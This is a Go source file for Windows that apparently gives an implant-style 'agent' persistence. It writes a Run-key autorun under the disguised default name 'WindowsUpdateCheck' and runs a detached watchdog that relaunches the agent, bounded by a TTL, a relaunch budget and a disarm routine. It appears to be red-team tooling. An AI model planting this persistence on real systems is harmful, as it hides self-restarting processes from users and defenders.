//go:build windows

package persist

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	// runKeyPath is the only registry path this package touches.
	runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`

	// defaultRunKeyName is used when Config.RunKeyName is empty. It is a
	// generic updater-style name; operators can override it. Defenders should
	// treat any unexpected value here as an autorun.
	defaultRunKeyName = "WindowsUpdateCheck"
)

var (
	errTTLExpired = errors.New("persist: TTL already expired")
	errBudgetEnv  = errors.New("persist: malformed " + envBudget)
	errDeadline   = errors.New("persist: malformed " + envDeadline)
)

// windowsManager implements Manager on Windows.
type windowsManager struct {
	cfg Config

	mu    sync.Mutex
	armed bool
	child *os.Process // detached watchdog, if any
	timer *time.Timer // TTL self-disarm, if any
}

// newManager validates cfg and returns a Windows manager.
func newManager(cfg Config) (Manager, error) {
	if cfg.ExePath == "" {
		return nil, fmt.Errorf("persist: ExePath is required for mode %q", cfg.Mode)
	}
	if !filepath.IsAbs(cfg.ExePath) {
		return nil, fmt.Errorf("persist: ExePath %q must be absolute", cfg.ExePath)
	}
	if cfg.RunKeyName == "" {
		cfg.RunKeyName = defaultRunKeyName
	}
	return &windowsManager{cfg: cfg}, nil
}

// Arm arms the configured mode. It is idempotent: a second call while armed
// is a no-op. On failure nothing is left half-armed (a Run key written before
// a failed watchdog spawn is rolled back) and the error is returned.
func (m *windowsManager) Arm() error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.armed {
		return nil
	}

	deadline, err := m.deadlineLocked()
	if err != nil {
		return err
	}

	if m.cfg.Mode == ModeRunKey || m.cfg.Mode == ModeBoth {
		if err := writeRunKey(m.cfg); err != nil {
			return fmt.Errorf("persist: arm run key: %w", err)
		}
	}
	if m.cfg.Mode == ModeWatchdog || m.cfg.Mode == ModeBoth {
		if err := m.spawnWatchdogLocked(deadline); err != nil {
			if m.cfg.Mode == ModeBoth {
				if rbErr := deleteRunKey(m.cfg); rbErr != nil {
					return errors.Join(
						fmt.Errorf("persist: arm watchdog: %w", err),
						fmt.Errorf("persist: roll back run key: %w", rbErr))
				}
			}
			return fmt.Errorf("persist: arm watchdog: %w", err)
		}
	}

	if !deadline.IsZero() {
		m.timer = time.AfterFunc(time.Until(deadline), func() { _ = m.Disarm() })
	}
	m.armed = true
	m.logf("armed mode=%s agent=%q pid=%d", m.cfg.Mode, m.cfg.AgentID, os.Getpid())
	return nil
}

// Disarm removes everything Arm installed. It is idempotent: disarming an
// unarmed manager (or a second time) succeeds. The watchdog is terminated
// best-effort; the Run value is deleted only if this package wrote it.
func (m *windowsManager) Disarm() error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.timer != nil {
		m.timer.Stop()
		m.timer = nil
	}

	var errs []error
	if m.child != nil {
		// Best effort: the child may have already relaunched and exited. The
		// retained process handle cannot hit a reused PID.
		_ = m.child.Kill()
		_ = m.child.Release()
		m.child = nil
	}
	if m.cfg.Mode == ModeRunKey || m.cfg.Mode == ModeBoth {
		if err := deleteRunKey(m.cfg); err != nil {
			errs = append(errs, fmt.Errorf("persist: disarm run key: %w", err))
		}
	}
	if m.armed {
		m.logf("disarmed mode=%s agent=%q", m.cfg.Mode, m.cfg.AgentID)
	}
	m.armed = false
	return errors.Join(errs...)
}

// Armed reports whether this manager has an armed artifact. It does not probe
// the registry or the child: it is the local lifecycle state.
func (m *windowsManager) Armed() bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.armed
}

// deadlineLocked computes the absolute end of the persistence window: the
// earlier of this Config's TTL and any chain deadline inherited from a
// relaunch. A zero result means the caller enforces the bound. Expired chain
// deadlines fail closed.
func (m *windowsManager) deadlineLocked() (time.Time, error) {
	now := time.Now()
	var chain time.Time
	if raw := os.Getenv(envDeadline); raw != "" {
		ns, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return time.Time{}, fmt.Errorf("%w: %q", errDeadline, raw)
		}
		chain = time.Unix(0, ns)
		if !chain.After(now) {
			return time.Time{}, errTTLExpired
		}
	}
	if m.cfg.TTL <= 0 {
		return chain, nil
	}
	local := now.Add(m.cfg.TTL)
	if chain.IsZero() || local.Before(chain) {
		return local, nil
	}
	return chain, nil
}

// spawnWatchdogLocked starts the detached watchdog child. The child command
// line is Config.Args plus the control triplet; the chain budget and deadline
// travel in the environment.
func (m *windowsManager) spawnWatchdogLocked(deadline time.Time) error {
	budget, err := watchdogBudget(os.Getenv(envBudget))
	if err != nil {
		return err
	}
	childArgs := make([]string, 0, len(m.cfg.Args)+3)
	childArgs = append(childArgs, m.cfg.Args...)
	childArgs = append(childArgs, watchdogFlag, strconv.Itoa(os.Getpid()), strconv.Itoa(budget))

	cmd := exec.Command(m.cfg.ExePath, childArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: windows.CREATE_NEW_PROCESS_GROUP | windows.DETACHED_PROCESS,
	}
	cmd.Env = watchdogEnv(budget, deadline)
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("spawn %s: %w", m.cfg.ExePath, err)
	}
	m.child = cmd.Process
	return nil
}

// watchdogBudget parses the inherited relaunch budget. Absent means the full
// maxRelaunchBudget; malformed means fail closed.
func watchdogBudget(raw string) (int, error) {
	if raw == "" {
		return maxRelaunchBudget, nil
	}
	n, err := strconv.Atoi(raw)
	if err != nil || n < 0 {
		return 0, fmt.Errorf("%w: %q", errBudgetEnv, raw)
	}
	if n > maxRelaunchBudget {
		n = maxRelaunchBudget
	}
	return n, nil
}

// watchdogEnv returns os.Environ with the chain variables replaced (never
// duplicated) and the given budget and deadline appended.
func watchdogEnv(budget int, deadline time.Time) []string {
	env := make([]string, 0, len(os.Environ())+2)
	for _, kv := range os.Environ() {
		if strings.HasPrefix(kv, envBudget+"=") || strings.HasPrefix(kv, envDeadline+"=") {
			continue
		}
		env = append(env, kv)
	}
	env = append(env, envBudget+"="+strconv.Itoa(budget))
	if !deadline.IsZero() {
		env = append(env, envDeadline+"="+strconv.FormatInt(deadline.UnixNano(), 10))
	}
	return env
}

// writeRunKey writes exactly one value under HKCU Run. It creates the Run key
// only if it is missing; no other registry path is touched.
func writeRunKey(cfg Config) error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, runKeyPath,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("open HKCU\\%s: %w", runKeyPath, err)
	}
	defer k.Close()
	if err := k.SetStringValue(cfg.RunKeyName, formatRunValue(cfg.ExePath, cfg.Args)); err != nil {
		return fmt.Errorf("set %s: %w", cfg.RunKeyName, err)
	}
	return nil
}

// deleteRunKey deletes only the value this package wrote. It is idempotent:
// a missing key or value is success.
func deleteRunKey(cfg Config) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		if errors.Is(err, registry.ErrNotExist) {
			return nil
		}
		return fmt.Errorf("open HKCU\\%s: %w", runKeyPath, err)
	}
	defer k.Close()
	if err := k.DeleteValue(cfg.RunKeyName); err != nil {
		if errors.Is(err, registry.ErrNotExist) {
			return nil
		}
		return fmt.Errorf("delete %s: %w", cfg.RunKeyName, err)
	}
	return nil
}

// formatRunValue renders the Run value: the executable always quoted, then the
// arguments quoted per Windows command-line rules.
func formatRunValue(exePath string, args []string) string {
	parts := make([]string, 0, len(args)+1)
	parts = append(parts, `"`+exePath+`"`)
	for _, a := range args {
		parts = append(parts, syscall.EscapeArg(a))
	}
	return strings.Join(parts, " ")
}

// MaybeRunWatchdogChild handles a watchdog invocation and must be called as
// the first statement of main. When os.Args carries the control triplet it
// never returns: it watches the agent, relaunches it through the bounded
// budget, and exits. handled is false when this is a normal process start.
func MaybeRunWatchdogChild() (handled bool, exitCode int) {
	found, parentPID, budget, relaunchArgs, err := parseWatchdogArgs(os.Args[1:])
	if !found {
		return false, 0
	}
	if err != nil {
		fmt.Fprintf(os.Stderr, "persist: %v\n", err)
		return true, watchdogChildFatal
	}
	return true, runWatchdogChild(parentPID, budget, relaunchArgs)
}

// runWatchdogChild waits on the agent PID, bounded by the chain deadline, and
// relaunches the agent once per unexpected exit while the budget lasts. It
// returns the watchdog's own exit code; 0 always means "stop, do not
// relaunch" (intentional stop, TTL, budget exhausted, or fail closed).
func runWatchdogChild(parentPID, budget int, relaunchArgs []string) int {
	deadline, err := chainDeadline()
	if err != nil {
		fmt.Fprintf(os.Stderr, "persist: %v\n", err)
		return watchdogChildFatal
	}
	if !deadline.IsZero() && !time.Now().Before(deadline) {
		return 0
	}

	handle, err := openParentForWait(parentPID)
	if err != nil {
		// The parent is gone and its exit status is unknowable. Fail closed
		// (toward a signed kill) rather than risk resurrecting a killed agent.
		return 0
	}
	defer windows.CloseHandle(handle)

	waitMS := uint32(windows.INFINITE)
	if !deadline.IsZero() {
		waitMS = durationToWaitMillis(time.Until(deadline))
	}

	event, err := windows.WaitForSingleObject(handle, waitMS)
	if err != nil || event == windows.WAIT_FAILED {
		return 0
	}
	switch event {
	case uint32(windows.WAIT_TIMEOUT):
		return 0 // TTL: persistence window closed.
	case windows.WAIT_OBJECT_0:
	default:
		return 0
	}

	var exitCode uint32
	if err := windows.GetExitCodeProcess(handle, &exitCode); err != nil {
		return 0
	}
	if exitCode == exitIntentionalKill || exitCode == exitIntentionalKillSwitch {
		return 0
	}
	if budget <= 0 {
		return 0
	}
	if !deadline.IsZero() && !time.Now().Before(deadline) {
		return 0
	}
	if err := relaunchAgent(relaunchArgs, budget-1, deadline); err != nil {
		fmt.Fprintf(os.Stderr, "persist: relaunch failed: %v\n", err)
		return watchdogChildFatal
	}
	return 0
}

// openParentForWait opens the parent with the minimum rights needed to wait on
// it and read its exit code, retrying briefly to absorb a spawn race.
func openParentForWait(pid int) (windows.Handle, error) {
	const attempts = 5
	access := uint32(windows.SYNCHRONIZE | windows.PROCESS_QUERY_LIMITED_INFORMATION)
	var lastErr error
	for i := 0; i < attempts; i++ {
		h, err := windows.OpenProcess(access, false, uint32(pid))
		if err == nil {
			return h, nil
		}
		lastErr = err
		if i < attempts-1 {
			time.Sleep(100 * time.Millisecond)
		}
	}
	return 0, lastErr
}

// relaunchAgent starts the agent again, detached, with the decremented budget
// and the preserved chain deadline in the environment.
func relaunchAgent(args []string, nextBudget int, deadline time.Time) error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}
	cmd := exec.Command(exe, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: windows.CREATE_NEW_PROCESS_GROUP | windows.DETACHED_PROCESS,
	}
	cmd.Env = watchdogEnv(nextBudget, deadline)
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start %s: %w", exe, err)
	}
	return cmd.Process.Release()
}

// chainDeadline parses the inherited absolute deadline, if any.
func chainDeadline() (time.Time, error) {
	raw := os.Getenv(envDeadline)
	if raw == "" {
		return time.Time{}, nil
	}
	ns, err := strconv.ParseInt(raw, 10, 64)
	if err != nil {
		return time.Time{}, fmt.Errorf("%w: %q", errDeadline, raw)
	}
	return time.Unix(0, ns), nil
}

// durationToWaitMillis converts a remaining duration to WaitForSingleObject
// milliseconds, clamped to [1, INFINITE-1].
func durationToWaitMillis(d time.Duration) uint32 {
	ms := d.Milliseconds()
	if ms < 1 {
		return 1
	}
	if ms > int64(windows.INFINITE)-1 {
		return windows.INFINITE - 1
	}
	return uint32(ms)
}

// logf logs through Config.Logger when one was supplied.
func (m *windowsManager) logf(format string, args ...any) {
	if m.cfg.Logger != nil {
		m.cfg.Logger.Printf(format, args...)
	}
}
